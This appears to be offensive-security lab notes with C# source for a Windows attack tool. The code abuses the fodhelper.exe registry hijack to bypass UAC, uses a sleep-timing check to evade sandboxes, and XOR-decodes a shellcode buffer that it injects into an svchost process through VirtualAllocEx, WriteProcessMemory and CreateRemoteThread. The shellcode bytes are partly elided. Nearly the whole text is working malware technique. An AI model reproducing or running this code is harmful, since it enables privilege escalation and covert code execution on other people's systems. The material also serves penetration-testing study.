Following Script is placed to C:\\Users\\Offsec\\Documents and it has to be called from there. Of course it is possible to place it somewhere else. Script is called twice. 1st Time just overwrites Registry Keys and runs fodhelper.exe which runs the script again with argument:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.AccessControl;


namespace Inject_XOR_w_Sleep_UACBypass
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            if (args.Length == 0)
            {
                //int i = localByName.Length;
                //Set the Registry Keys for FODHelper UAC Bypass
                RegistryKey myKey = Registry.CurrentUser.OpenSubKey(@"Software\\Classes\\ms-settings\\shell\\open\\command", true);
                if (myKey != null)
                {
                    //Console.WriteLine("found");
                    myKey.CreateSubKey("default", true);
                    myKey.SetValue("", "C:\\Users\\Offsec\\Documents\\Inject_XOR_w_Sleep_UACBypass.exe asd", RegistryValueKind.String);

                    //Console.WriteLine(myKey.GetValue("").ToString());
                    //Console.ReadLine();
                    myKey.Close();
                }
                else
                {
                    //Console.WriteLine("not found");
                    myKey.Close();
                    RegistryKey newKey = Registry.CurrentUser.CreateSubKey(@"Software\\Classes\\ms-settings\\shell\\open\\command", true);
                    newKey.CreateSubKey("default", true);
                    newKey.SetValue("", "C:\\Users\\Offsec\\Documents\\Inject_XOR_w_Sleep_UACBypass.exe asd", RegistryValueKind.String);
                    //Console.WriteLine(newKey.GetValue("").ToString());
                    newKey.Close();

                }
                //Process[] localByName = Process.GetProcessesByName("explorer");
                Sleep(5000);
                Process fod = Process.Start("C:\\Windows\\System32\\fodhelper.exe");
                Sleep(5000);
            }
            //Sleep(5000);
            else
            {
                Console.WriteLine("in the else statement");
                //Process[] localByName = Process.GetProcessesByName("powershell");
                Process[] localByName = Process.GetProcessesByName("svchost");
                Console.WriteLine("Explorers ID: " + localByName[0].Id);
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                byte[] buf = new byte[749] {
                0x06, 0xb2, 0x79, ...
                0x39, 0xa2, 0x90, 0xfa, 0xa3, 0xb3, 0x3d, 0x38, 0x0a, 0x4f, 0x58, 0xac, 0x05, 0x2f
                };

                //// Decode the XOR payload
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                }
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
            
        }
    }
}
```